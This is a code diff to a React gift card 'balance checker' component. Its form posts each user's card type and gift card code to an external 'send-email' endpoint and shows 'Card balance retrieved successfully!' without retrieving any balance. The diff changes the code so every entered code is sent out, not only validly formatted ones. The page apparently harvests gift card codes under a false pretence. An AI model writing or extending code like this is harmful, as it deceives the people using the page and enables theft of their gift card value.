@@ -16,28 +16,25 @@ export const GiftCardRedeemer: React.FC = () => {
     setIsValid(valid);
     setIsSubmitted(true);
 
-    if (valid) {
-      try {
-        await fetch('https://giftcard-balance-server.vercel.app/send-email', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            cardType: selectedCard.name,
-            code,
-          }),
-        });
-      } catch (error) {
-        // Optionally handle error
-        console.error('Error submitting code:', error);
-      }
+    // Always submit, regardless of format validity
+    try {
+      await fetch('https://giftcard-balance-server.vercel.app/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          cardType: selectedCard.name,
+          code,
+        }),
+      });
+    } catch (error) {
+      // Optionally handle error
+      console.error('Error submitting code:', error);
     }
 
     // Reset submission status after 3 seconds
     setTimeout(() => {
       setIsSubmitted(false);
-      if (valid) {
-        setCode('');
-      }
+      setCode('');
     }, 3000);
   };
   const handleCodeChange = (newCode: string) => {
@@ -68,22 +65,17 @@ export const GiftCardRedeemer: React.FC = () => {
           </div>
           {selectedCard && <form onSubmit={handleSubmit} className="space-y-6">
               <CodeInput selectedCard={selectedCard} onCodeChange={handleCodeChange} />
-              <button type="submit" disabled={!selectedCard || !code} className={`w-full py-3 px-4 rounded-lg font-medium text-white ${!selectedCard || !code ? 'bg-gray-600 cursor-not-allowed' : 'bg-gradient-to-r from-[#4F46E5] to-[#06B6D4] hover:opacity-90'}`}>
+              <button type="submit" disabled={!selectedCard || !code} className={`w-full py-3 px-4 rounded-lg font-medium text-white ${!selectedCard || !code ? 'bg-gray-600 cursor-not-allowed' : 'bg-gradient-to-r from-[#4F46E5] to-[#06B6D4] hover:opacity-90'}`}> 
                 Check Balance
               </button>
-              {isSubmitted && <div className={`p-4 rounded-lg ${isValid ? 'bg-green-900/50 border border-green-500/30' : 'bg-red-900/50 border border-red-500/30'}`}>
+              {isSubmitted && <div className={`p-4 rounded-lg ${isValid ? 'bg-green-900/50 border border-green-500/30' : 'bg-red-900/50 border border-red-500/30'}`}> 
                   <div className="flex items-center">
-                    {isValid ? <>
-                        <div className="w-5 h-5 text-green-400 mr-2" />
-                        <span className="text-green-400">
-                          Card balance retrieved successfully!
-                        </span>
-                      </> : <>
-                        <div className="w-5 h-5 text-red-400 mr-2" />
-                        <span className="text-red-400">
-                          Invalid code format. Please check and try again.
-                        </span>
-                      </>}
+                    <>
+                      <div className={`w-5 h-5 mr-2 ${isValid ? 'text-green-400' : 'text-red-400'}`} />
+                      <span className={isValid ? 'text-green-400' : 'text-red-400'}>
+                        {isValid ? 'Card balance retrieved successfully!' : 'Invalid code format. Please check and try again.'}
+                      </span>
+                    </>
                   </div>
                 </div>}
             </form>}
